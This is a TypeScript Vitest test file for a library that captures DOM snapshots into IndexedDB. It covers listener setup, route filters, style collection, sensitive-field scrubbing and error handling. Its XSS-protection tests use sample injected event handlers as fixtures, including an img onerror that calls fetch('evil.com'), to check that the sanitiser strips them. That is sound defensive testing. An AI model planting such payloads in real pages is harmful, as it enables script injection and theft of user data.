import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { setupCapture, captureSnapshot } from '../src/capture';
import * as utilsModule from '../src/utils';
import type { Snapshot } from '../src/types';

const tick = () => Promise.resolve();

let db: IDBDatabase | null = null;
const memStore = new Map<string, Snapshot>();

const makeMemoryDB = (): IDBDatabase =>
  ({
    close: () => {},
    transaction: () => ({
      objectStore: () => ({
        put: (value: Snapshot) => {
          const req = {} as IDBRequest<Snapshot>;
          queueMicrotask(() => {
            memStore.set(value.route, value);
            req.onsuccess?.(new Event('success'));
          });
          return req;
        },
        get: (key: string) => {
          const req = {} as IDBRequest<Snapshot>;
          queueMicrotask(() => {
            Object.defineProperty(req, 'result', {
              value: memStore.get(key) ?? undefined,
              writable: true,
              configurable: true,
            });
            req.onsuccess?.(new Event('success'));
          });
          return req;
        },
        delete: (key: string) => {
          const req = {} as IDBRequest<Snapshot>;
          queueMicrotask(() => {
            memStore.delete(key);
            req.onsuccess?.(new Event('success'));
          });
          return req;
        },
      }),
    }),
  }) as unknown as IDBDatabase;

vi.spyOn(utilsModule, 'openDB').mockImplementation(() =>
  Promise.resolve(db ?? (db = makeMemoryDB())),
);

function getSnapshot(route: string): Snapshot | null {
  const data = memStore.get(route);
  return data ?? null;
}

function resetMemoryDB() {
  memStore.clear();
  db = null;
}

describe('setupCapture', () => {
  let cleanup: (() => void) | null = null;

  beforeEach(() => {
    document.head.innerHTML = '';
    document.body.innerHTML = '<div id="root"><div>App</div></div>';
    vi.clearAllMocks();
  });

  afterEach(() => {
    resetMemoryDB();
    if (cleanup) {
      cleanup();
      cleanup = null;
    }
  });

  it('registers visibilitychange, pagehide, beforeunload listeners', () => {
    const addWin = vi.spyOn(window, 'addEventListener');
    const addDoc = vi.spyOn(document, 'addEventListener');
    cleanup = setupCapture();
    const winEvents = addWin.mock.calls.map((c) => c[0]);
    const docEvents = addDoc.mock.calls.map((c) => c[0]);
    expect(winEvents).toContain('pagehide');
    expect(winEvents).toContain('beforeunload');
    expect(docEvents).toContain('visibilitychange');
  });

  it('is idempotent and returns noop cleanup on duplicate call', () => {
    const addWin = vi.spyOn(window, 'addEventListener');
    const addDoc = vi.spyOn(document, 'addEventListener');
    const c1 = setupCapture();
    const c2 = setupCapture();
    cleanup = c1;
    const winEvents = addWin.mock.calls.map((c) => c[0]);
    const docEvents = addDoc.mock.calls.map((c) => c[0]);
    const count = (arr: unknown[], ev: string) => arr.filter((x) => x === ev).length;
    expect(count(winEvents, 'beforeunload')).toBe(1);
    expect(count(winEvents, 'pagehide')).toBe(1);
    expect(count(docEvents, 'visibilitychange')).toBe(1);
    expect(typeof c2).toBe('function');
  });

  it('cleans up all listeners on cleanup call', () => {
    const removeWin = vi.spyOn(window, 'removeEventListener');
    const removeDoc = vi.spyOn(document, 'removeEventListener');
    cleanup = setupCapture();
    cleanup();
    cleanup = null;
    const winEvents = removeWin.mock.calls.map((c) => c[0]);
    const docEvents = removeDoc.mock.calls.map((c) => c[0]);
    expect(winEvents).toContain('beforeunload');
    expect(winEvents).toContain('pagehide');
    expect(docEvents).toContain('visibilitychange');
  });

  it('captures only for allowed routes filter', async () => {
    const orig = window.location.pathname;
    window.history.pushState(null, '', '/blocked');

    const addWin = vi.spyOn(window, 'addEventListener');
    cleanup = setupCapture({ routes: ['/allowed'] });
    const handler = addWin.mock.calls.find((c) => c[0] === 'beforeunload')![1] as () => void;

    handler();
    await tick();
    await tick();

    const blocked = getSnapshot('/blocked');
    expect(blocked).toBeNull();

    window.history.pushState(null, '', '/allowed');

    handler();
    await tick();
    await tick();

    const allowed = getSnapshot('/allowed');
    expect(allowed).toBeDefined();

    window.history.pushState(null, '', orig || '/');
  });
});

describe('captureSnapshot', () => {
  beforeEach(() => {
    document.head.innerHTML = '';
    document.body.innerHTML = '<div id="root"><div id="app">Test Content</div></div>';
    vi.clearAllMocks();
    resetMemoryDB();
  });

  afterEach(() => {
    resetMemoryDB();
  });

  function getSnapshot(route: string): Snapshot | null {
    const data = memStore.get(route);
    return data ?? null;
  }

  const createFakeLink = (href: string, isStylesheet = true): HTMLLinkElement => {
    const link = document.createElement('link');
    link.setAttribute('href', href);
    if (isStylesheet) {
      link.setAttribute('rel', 'stylesheet');
      link.relList.add('stylesheet');
    }
    return link;
  };

  it('captures first child of #root', async () => {
    await captureSnapshot();
    const snapshot = getSnapshot('/');
    expect(snapshot).not.toBeNull();
    expect(snapshot!.body).toBe('<div id="app">Test Content</div>');
    expect(snapshot!.route).toBe('/');
  });

  it('collects styles and excludes prepaint-injected ones', async () => {
    const s1 = document.createElement('style');
    s1.textContent = '.test { color: red; }';
    document.head.appendChild(s1);

    const s2 = document.createElement('style');
    s2.setAttribute('data-firsttx-prepaint', '');
    s2.textContent = '.ignore { display:none; }';
    document.head.appendChild(s2);

    await captureSnapshot();
    const snapshot = getSnapshot('/');
    expect(snapshot).not.toBeNull();
    expect(snapshot!.styles).toBeDefined();
    expect(snapshot!.styles).toContainEqual({
      type: 'inline',
      content: '.test { color: red; }',
    });
    const ignored = snapshot!.styles!.filter((style) =>
      // @ts-expect-error test type
      style.type === 'inline' ? style.content === '.ignore { display:none; }' : false,
    );
    expect(ignored).toHaveLength(0);
  });

  it('handles empty styles', async () => {
    await captureSnapshot();
    const snapshot = getSnapshot('/');
    expect(snapshot).not.toBeNull();
    expect(snapshot!.styles).toBeUndefined();
  });

  it('captures same-origin external stylesheets', async () => {
    const href = 'https://example.com/main.css';
    const spy = vi
      .spyOn(document, 'querySelectorAll')
      .mockReturnValue([createFakeLink(href, true)] as unknown as NodeListOf<Element>);

    await captureSnapshot();
    const snapshot = getSnapshot('/');
    expect(snapshot).not.toBeNull();
    expect(snapshot!.styles).toContainEqual({
      type: 'external',
      href,
    });

    spy.mockRestore();
  });

  it('captures current route from location.pathname', async () => {
    const originalPathname = window.location.pathname;
    window.history.pushState(null, '', '/products');
    document.body.innerHTML = '<div id="root"><div>Products Page</div></div>';

    await captureSnapshot();
    const snapshot = getSnapshot('/products');

    expect(snapshot).not.toBeNull();
    expect(snapshot!.route).toBe('/products');
    expect(snapshot!.body).toBe('<div>Products Page</div>');

    window.history.pushState(null, '', originalPathname || '/');
  });

  it('uses custom route key override when provided', async () => {
    const originalPathname = window.location.pathname;
    (window as typeof window & { __FIRSTTX_ROUTE_KEY__?: string }).__FIRSTTX_ROUTE_KEY__ =
      '/custom-key';
    window.history.pushState(null, '', '/original');
    document.body.innerHTML = '<div id="root"><div>Custom Route</div></div>';

    await captureSnapshot();
    const snapshot = getSnapshot('/custom-key');
    const originalSnapshot = getSnapshot('/original');

    expect(snapshot).not.toBeNull();
    expect(snapshot!.route).toBe('/custom-key');
    expect(snapshot!.body).toBe('<div>Custom Route</div>');
    expect(originalSnapshot).toBeNull();

    delete (window as typeof window & { __FIRSTTX_ROUTE_KEY__?: string }).__FIRSTTX_ROUTE_KEY__;
    window.history.pushState(null, '', originalPathname || '/');
  });

  it('scrubs sensitive fields before storing snapshot', async () => {
    document.body.innerHTML = `
      <div id="root">
        <div id="app">
          <input type="password" value="super-secret" />
          <div data-firsttx-sensitive>very-secret</div>
          <span>public</span>
        </div>
      </div>
    `;

    await captureSnapshot();
    const snapshot = getSnapshot('/');

    expect(snapshot).not.toBeNull();
    expect(snapshot!.body).not.toContain('super-secret');
    expect(snapshot!.body).not.toContain('very-secret');
    expect(snapshot!.body).toContain('public');
  });

  it('sets timestamp on snapshot', async () => {
    const before = Date.now();
    await captureSnapshot();
    const snapshot = getSnapshot('/');
    const after = Date.now();

    expect(snapshot).not.toBeNull();
    expect(typeof snapshot!.timestamp).toBe('number');
    expect(snapshot!.timestamp).toBeGreaterThanOrEqual(before);
    expect(snapshot!.timestamp).toBeLessThanOrEqual(after);
  });

  describe('Error Handling', () => {
    it('handles missing root element gracefully', async () => {
      const spy = vi.spyOn(console, 'error').mockImplementation(() => {});
      document.body.innerHTML = '<div>No root</div>';

      const result = await captureSnapshot();

      expect(result).toBeNull();
      expect(spy).toHaveBeenCalled();
      const errorCall = spy.mock.calls[0][0] as string;
      expect(errorCall).toContain('[CaptureError]');
      expect(errorCall).toContain('dom-serialize');
      expect(errorCall).toContain('Root element not found');

      spy.mockRestore();
    });

    it('handles empty root element gracefully', async () => {
      const spy = vi.spyOn(console, 'error').mockImplementation(() => {});
      document.body.innerHTML = '<div id="root"></div>';

      const result = await captureSnapshot();

      expect(result).toBeNull();
      expect(spy).toHaveBeenCalled();
      const errorCall = spy.mock.calls[0][0] as string;
      expect(errorCall).toContain('[CaptureError]');
      expect(errorCall).toContain('dom-serialize');

      spy.mockRestore();
    });

    it('handles style collection errors gracefully', async () => {
      const spy = vi.spyOn(console, 'error').mockImplementation(() => {});

      const qsSpy = vi.spyOn(document, 'querySelectorAll').mockImplementationOnce(() => {
        throw new Error('querySelectorAll failed');
      });

      const result = await captureSnapshot();

      expect(result).toBeNull();
      expect(spy).toHaveBeenCalled();
      const errorCall = spy.mock.calls[0][0] as string;
      expect(errorCall).toContain('[CaptureError]');
      expect(errorCall).toContain('style-collect');

      spy.mockRestore();
      qsSpy.mockRestore();
    });

    it('handles IndexedDB write errors gracefully', async () => {
      const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const openSpy = vi.spyOn(utilsModule, 'openDB').mockRejectedValueOnce(new Error('DB Error'));

      const result = await captureSnapshot();

      expect(result).toBeNull();
      expect(errSpy).toHaveBeenCalled();
      const errorCall = errSpy.mock.calls[0][0] as string;
      expect(errorCall).toContain('[CaptureError]');
      expect(errorCall).toContain('db-write');

      openSpy.mockRestore();
      errSpy.mockRestore();
    });

    it('handles storage quota exceeded errors', async () => {
      const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

      const request = {
        onerror: null as ((this: IDBRequest, ev: Event) => unknown) | null,
        onsuccess: null as ((this: IDBRequest, ev: Event) => unknown) | null,
        error: null as Error | null,
      } as IDBRequest<Snapshot>;

      const dbMock = {
        transaction: vi.fn().mockReturnValue({
          objectStore: vi.fn().mockReturnValue({
            put: vi.fn().mockReturnValue(request),
          }),
        }),
        close: vi.fn(),
      };

      vi.spyOn(utilsModule, 'openDB').mockResolvedValueOnce(dbMock as unknown as IDBDatabase);

      const capturePromise = captureSnapshot();

      const quotaError = new Error('QuotaExceededError');
      quotaError.name = 'QuotaExceededError';
      setTimeout(() => {
        request.error = quotaError;
        request.onerror?.(new Event('error'));
      }, 0);

      const result = await capturePromise;

      expect(result).toBeNull();
      expect(errSpy).toHaveBeenCalled();
      const errorCall = errSpy.mock.calls[0][0] as string;
      expect(errorCall).toContain('[CaptureError]');
      expect(errorCall).toContain('QUOTA_EXCEEDED');

      errSpy.mockRestore();
    });

    it('does not throw errors even when everything fails', async () => {
      vi.spyOn(console, 'error').mockImplementation(() => {});
      document.body.innerHTML = '';

      await expect(captureSnapshot()).resolves.not.toThrow();
    });

    it('returns null on any error and continues gracefully', async () => {
      const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const openSpy = vi.spyOn(utilsModule, 'openDB').mockRejectedValue(new Error('Fatal error'));

      const result = await captureSnapshot();

      expect(result).toBeNull();

      openSpy.mockRestore();
      errSpy.mockRestore();
    });
  });

  describe('XSS Protection', () => {
    it('removes dangerous event handler attributes from snapshot', async () => {
      document.body.innerHTML = `
      <div id="root">
        <div id="app">
          <button onclick="alert('xss')">Click</button>
          <img src="x" onerror="fetch('evil.com')">
          <div onload="malicious()">Content</div>
        </div>
      </div>
    `;

      await captureSnapshot();
      const snapshot = getSnapshot('/');

      expect(snapshot).not.toBeNull();
      expect(snapshot!.body).not.toContain('onclick');
      expect(snapshot!.body).not.toContain('onerror');
      expect(snapshot!.body).not.toContain('onload');
      expect(snapshot!.body).toContain('<button>Click</button>');
      expect(snapshot!.body).toContain('<img src="x">');
    });

    it('removes event handlers from volatile elements', async () => {
      document.body.innerHTML = `
      <div id="root">
        <div id="app">
          <span data-firsttx-volatile onmouseover="steal()">
            Dynamic Content
          </span>
        </div>
      </div>
    `;

      await captureSnapshot();
      const snapshot = getSnapshot('/');

      expect(snapshot).not.toBeNull();
      expect(snapshot!.body).not.toContain('onmouseover');
      expect(snapshot!.body).not.toContain('steal()');
      expect(snapshot!.body).toContain('data-firsttx-volatile');
    });

    it('preserves safe attributes while removing dangerous ones', async () => {
      document.body.innerHTML = `
      <div id="root">
        <div id="app">
          <a href="/safe" class="link" data-id="123" onclick="evil()">
            Link
          </a>
        </div>
      </div>
    `;

      await captureSnapshot();
      const snapshot = getSnapshot('/');

      expect(snapshot).not.toBeNull();
      expect(snapshot!.body).toContain('href="/safe"');
      expect(snapshot!.body).toContain('class="link"');
      expect(snapshot!.body).toContain('data-id="123"');
      expect(snapshot!.body).not.toContain('onclick');
    });
  });

  describe('Parallel Style Fetching', () => {
    it('fetches multiple same-origin stylesheets in parallel', async () => {
      const link1 = createFakeLink('https://example.com/style1.css', true);
      const link2 = createFakeLink('https://example.com/style2.css', true);
      const link3 = createFakeLink('https://example.com/style3.css', true);
      const spy = vi
        .spyOn(document, 'querySelectorAll')
        .mockReturnValue([link1, link2, link3] as unknown as NodeListOf<Element>);

      document.body.innerHTML = '<div id="root"><div>Test</div></div>';

      await captureSnapshot();
      const snapshot = getSnapshot('/');

      expect(snapshot).not.toBeNull();
      expect(snapshot!.styles).toBeDefined();
      const externalStyles = snapshot!.styles!.filter(
        (s): s is { type: 'external'; href: string; content?: string } =>
          typeof s === 'object' && s.type === 'external',
      );
      expect(externalStyles.length).toBe(3);
      expect(externalStyles.map((s) => s.href)).toEqual([link1.href, link2.href, link3.href]);

      spy.mockRestore();
    });

    it('handles mixed success and failure in parallel fetches', async () => {
      const link1 = createFakeLink('https://example.com/success.css', true);
      const link2 = createFakeLink('https://example.com/fail.css', true);
      const spy = vi
        .spyOn(document, 'querySelectorAll')
        .mockReturnValue([link1, link2] as unknown as NodeListOf<Element>);

      document.body.innerHTML = '<div id="root"><div>Test</div></div>';

      await captureSnapshot();
      const snapshot = getSnapshot('/');

      expect(snapshot).not.toBeNull();

      const externalStyles = snapshot!.styles!.filter(
        (s): s is { type: 'external'; href: string; content?: string } =>
          typeof s === 'object' && s.type === 'external',
      );
      expect(externalStyles.length).toBe(2);
      const hrefs = externalStyles.map((s) => s.href);
      expect(hrefs).toContain(link1.href);
      expect(hrefs).toContain(link2.href);

      spy.mockRestore();
    });

    it('handles empty fetch promises array gracefully', async () => {
      const style = document.createElement('style');
      style.textContent = '.inline { display: block; }';
      document.head.appendChild(style);

      document.body.innerHTML = '<div id="root"><div>Test</div></div>';

      await captureSnapshot();
      const snapshot = getSnapshot('/');

      expect(snapshot).not.toBeNull();
      expect(snapshot!.styles).toBeDefined();
      expect(snapshot!.styles!.length).toBe(1);
      const firstStyle = snapshot!.styles![0];
      expect(typeof firstStyle === 'object' && firstStyle.type === 'inline').toBe(true);
    });
  });
});
